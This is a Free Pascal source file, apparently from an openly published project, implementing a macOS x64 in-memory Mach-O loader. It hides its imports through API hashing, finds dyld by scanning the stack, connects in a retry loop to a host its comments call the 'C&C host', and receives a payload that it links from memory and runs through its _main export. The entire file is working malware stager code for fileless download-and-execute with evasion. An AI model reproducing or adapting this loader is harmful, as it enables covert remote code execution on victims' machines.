{
  the main module functions .
      - API Hashing Function .
      - Get Modules loaded in Memory .
      - Load macho in memory .

  Copyright(c) 2018 Coldzer0 .
  contact : <Coldzer0 [at] protonmail.ch> .
  License: GPLv2 .
}
unit LoadFunctions;

{$mode delphi}
{$Hints OFF}
{$SMARTLINK ON}
{$asmmode intel}

interface
  uses
    ulibc,
    macho,
    Sockets;

function loadall : boolean;

var
  NSCreateObjectFileImageFromMemory : function (address : Pointer; Size : longint; FileImage : Pointer) : longint; cdecl;
  NSLinkModule : function (Imagefile : Pointer;plapla : PChar; Option : longint):Pointer; cdecl;
  NSLookupSymbolInModule : function (module : Pointer; name : PChar): Pointer; cdecl;
  NSAddressOfSymbol : function (symbol : Pointer) : Pointer; cdecl;
  _main : procedure; cdecl;

implementation

const
  PAGE_SIZE = $1000;


function roundUP(size,pagesz : Integer): longint; inline;
begin
  Result := (size + pagesz -1) and not(PAGE_SIZE-1);
end;

function GetProcAddrByName(module :Pointer; name : PChar) : Pointer;
var
  sym : Pointer;
begin
  Result := nil;
  sym := NSLookupSymbolInModule(module, name);
  if sym <> nil then
     Result := NSAddressOfSymbol(sym);
end;


function is_ptr_valid(uPtr : pointer) : boolean; assembler;nostackframe;register;
asm
  push rbx
  mov rax,$200000F // chmod ..
//  mov rdi , uPtr // Our Pointer/removed cuz it's alread done by compiler from param
  mov rsi,511      // 0777 oct - 511 dec .
  syscall
  xor rbx,rbx
  cmp rax,2
  cmovne rax,rbx    // if rax <> 2 then move 0 to rax as False else it will be true
  pop rbx
end;

// DJBHash ..
function hash(name : PChar) : uint32;
var
  c : int32;
begin
  result := 5381;
  c := Pbyte(name)^;
  while ( c <> 0) do
  begin
    result := ((result shl 5) + result) + c;
    inc(name);
    c := Pbyte(name)^;
  end;
end;

function is_macho_x64 (mhPtr : Pointer) : boolean;
var
  mh : pmach_header_64;
begin
  Result := False;
  if mhPtr <> nil then
  begin
    mh := pmach_header_64(mhPtr);
    if (mh^.magic = MH_MAGIC_64) and
       (mh^.cputype = CPU_TYPE_X86_64) then
       Result := true;
  end;
end;

function Resolve_Symbol(mhPtr : pmach_header_64; LibHASH , FuncHash : QWord) : Pointer;
var
  seg , seg_linkedit , seg_text : psegment_command_64;
  sym : psymtab_command;
  dlb : pdylib_command;
  nls : pnlist_64;
  cmd : pload_command;
  strtab : PChar;
  mh : pmach_header_64;
  sym_hash, file_slide : QWord;
  x ,y :longint;
  name , sym_name : PChar;
  Found : boolean;
begin
  result := nil;

  sym := result; seg_linkedit := result; seg_text := result;

  Found := False;

  mh := pmach_header_64(mhPtr);
  cmd := pload_command(Pointer(QWord(mh) + SizeOf(mach_header_64)));
  for x := 0 to mh^.ncmds do
  begin
     case cmd^.cmd of
      LC_SEGMENT_64:
        begin
          seg := psegment_command_64(cmd);
          if hash(seg^.segname) = $c214bfb7 then // __LINKEDIT .
             seg_linkedit := seg;

          if hash(seg^.segname) = $ec5f7168 then // __TEXT .
             seg_text := seg;
        end;
      LC_ID_DYLIB,LC_ID_DYLINKER:
        begin
          dlb  := pdylib_command(cmd);
          name := Pointer(QWord(cmd) + dlb^.dylib.name.offset);
          if hash(name) = LibHASH then
            Found := true
          else
            break;
        end;
      LC_SYMTAB:
        begin
          sym := psymtab_command(cmd);
        end;
     end;
     cmd := pload_command(Pointer(QWord(cmd) + cmd^.cmdsize));
  end;
  // Check that everything set as it should .
  if (Found = true) and (sym <> nil) and (seg_linkedit <> nil) and (seg_text <> nil) then
  begin
    //strtab := PChar(Pointer(QWord(mh) + seg_linkedit^.vmaddr + sym^.stroff - seg_linkedit^.fileoff - seg_text^.vmaddr));
    file_slide := (seg_linkedit^.vmaddr - seg_text^.vmaddr - seg_linkedit^.fileoff);
    strtab := PChar(Pointer(QWord(mh) + sym^.stroff + file_slide));
    nls := pnlist_64( Pointer(QWord(mh) + sym^.symoff + file_slide));

    for y := 0 to sym^.nsyms do
    begin
      sym_name := Pchar(Pointer(QWord(strtab) + nls[y].n_un.n_strx));
      sym_hash := hash(sym_name);
      //printf('name : %s '#10,[sym_name]);
      if sym_hash = FuncHash then
      begin
        //if nls[y].n_value = 0 then
        //   continue;
        Result := Pointer(QWord(mh) + nls[y].n_value - seg_text^.vmaddr);
        break;
      end;
    end;
  end;
end;

function GetStackPtr : Pointer; assembler; nostackframe;
asm
 mov  rax,rsp
end;

function GetFuncAddr(LibHASH , FuncHASH : QWord) : Pointer;
var
  x , y : longint;
  stack, sPtr , addr : Pointer;
begin
  Result := nil;
  stack := GetStackPtr();

  while is_ptr_valid(Pointer(QWord(stack) + 1)) do
    inc(stack);

  for x := 0 to 10000 do
  begin
    sPtr := Pointer(QWord(stack) - x);

    if ( not is_ptr_valid(sPtr)) or ( not is_ptr_valid(Pointer(sPtr^))) then
     continue;

    // algin to PAGE_SIZE ..
    addr := Pointer(QWord(sPtr^) and not(PAGE_SIZE-1));

    for y := 0 to 100 do
    begin
      if (is_ptr_valid(addr)) and (is_macho_x64(addr)) then
      begin
        Result := Resolve_Symbol(pmach_header_64(addr),LibHASH,FuncHash);
        if Result <> nil then
         break;
      end;
      dec(addr,PAGE_SIZE);
    end;
    if result <> nil then break;
  end;
  if result = nil then _exit; // RES_EXIT  = this check here to elemenate the check of address if NULL or not 
end;

procedure Sleep(milliseconds: Cardinal);
Var
  timeout,timeoutresult : TTimespec;
  res: longint;
const
  ESysEINTR = 4;
begin
  timeout.tv_sec:=milliseconds div 1000;
  timeout.tv_nsec:=1000*1000*(milliseconds mod 1000);
  repeat
    res:=nanosleep(@timeout,@timeoutresult);
    timeout:=timeoutresult;
  until (res<>-1) or (errno^<>ESysEINTR);
end;

function GetHostIP(const Name: PChar): DWord;
var
  HE: PHostEnt;
  P: PDWord;
begin
  Result := 0;
  HE := nil;
  HE := gethostbyname(Name);
  if Assigned(HE) then begin
    P := Pointer(HE^.h_addr_list[0]);
    Result := DWord(P^);
  end;
end;

function Connect_recv(Buffer : Pointer; MaxSize : int64) : longint;
var
  sockfd : longint;
  serv_addr : sockaddr_in;
  rd : longint;
begin
  Result := 0;

  sockfd := socket(AF_INET,SOCK_STREAM,0);
  if sockfd < 0 then _exit(); // if we can't get socket then terminate .

  serv_addr.sin_family := AF_INET;
  serv_addr.sin_addr   := GetHostIP('localhost'); // payload <macho> C&C host ..
  if serv_addr.sin_addr = 0 then _Exit; // Kill self if host not resolved  ..
  serv_addr.sin_port   := htons(1234); // Port ..

  // connection loop till we got connected ..
  while connect(sockfd,@serv_addr,SizeOf(sockaddr_in)) < 0 do
  begin
    close(sockfd);
    sockfd := socket(AF_INET,SOCK_STREAM,0);
    if sockfd < 0 then _exit();
    sleep(2000);
  end;

  while MaxSize > 0 do
  begin
    rd := read(sockfd,Buffer,MaxSize);
    if rd > 0 then
    begin
      MaxSize -= rd;
      inc(Buffer,rd);
      Result += rd;
    end
    else
      break;
  end;
  close(sockfd);
end;

function loadall : boolean;
var
  data, Fileimage , Module : pointer;
const
  NSLINKMODULE_OPTION_PRIVATE = 2;

  _NSLinkModule = $6f320e79;
  _NSAddressOfSymbol = $f4da6396;
  _NSLookupSymbolInModule = $515bc152;
  _NSCreateObjectFileImageFromMemory = $64c5cea0;

  _open  = $ef4dff6;
  _lseek = $ed5c3998;
  _mmap  = $ef3b9ef;
  _read  = $ef655c0;
  _close = $ecb5b2ba;
  //_dlopen = $85c12646;
  //_dlsym = $ecc7dd0d;

  _socket  = $a8ee276d;
  _connect = $f7d7f9ee;
  ___error = $9dfc0aac;

  libc       = $714fb237;
  _nanoskeep = $66d4a0e9;

  libsystem_info = $1d5b0a0;
  _gethostbyname = $cd1964de;
var
   DYLD_HASH , mem_size : QWord;
   Size : longint;
begin
  result := False;

  DYLD_HASH := $9d683b90; // /usr/lib/dyld
  mem_size  := 10*1024*1024; // 10 MB - it's more than enough i think :P ..

  @nanosleep := GetFuncAddr(libc, _nanoskeep);
  @errno := GetFuncAddr(DYLD_HASH, ___error);

  @open  := GetFuncAddr(DYLD_HASH , _open);
  @lseek := GetFuncAddr(DYLD_HASH , _lseek);
  @mmap  := GetFuncAddr(DYLD_HASH , _mmap);
  @read  := GetFuncAddr(DYLD_HASH , _read);
  @close := GetFuncAddr(DYLD_HASH , _close);

  @gethostbyname := GetFuncAddr(libsystem_info, _gethostbyname);
  @socket  := GetFuncAddr(DYLD_HASH , _socket);
  @connect := GetFuncAddr(DYLD_HASH , _connect);

  @NSCreateObjectFileImageFromMemory := GetFuncAddr(DYLD_HASH , _NSCreateObjectFileImageFromMemory);
  @NSLookupSymbolInModule := GetFuncAddr(DYLD_HASH , _NSLookupSymbolInModule);
  @NSAddressOfSymbol := GetFuncAddr(DYLD_HASH , _NSAddressOfSymbol);
  @NSLinkModule := GetFuncAddr( DYLD_HASH , _NSLinkModule);

  data := mmap(nil,mem_size,PROT_READ or PROT_WRITE,MAP_PRIVATE or MAP_ANON,-1,0);
  if data <> nil then
  begin
    Size := Connect_Recv(data,mem_size);
    if size > 0 then
    begin
      pmach_header_64(data)^.filetype := MH_BUNDLE; // to make sure it will be MH_BUNDLE ..
      if NSCreateObjectFileImageFromMemory(data,Size,@Fileimage) = 1 then
      if Fileimage <> nil then
      begin
        Module := NSLinkModule(Fileimage,PChar(''),NSLINKMODULE_OPTION_PRIVATE);
        if Module <> nil then
        begin
          {
           this code here if the file is a dylib
           and have exports like in this case '_main'
           you can remove it if you want to call the init function only :D .
          }
          @_main := GetProcAddrByName(Module,'_main');
          if @_main <> nil then
             _main;
          result := true;
        end;
      end;
    end;
  end;
end;

end.

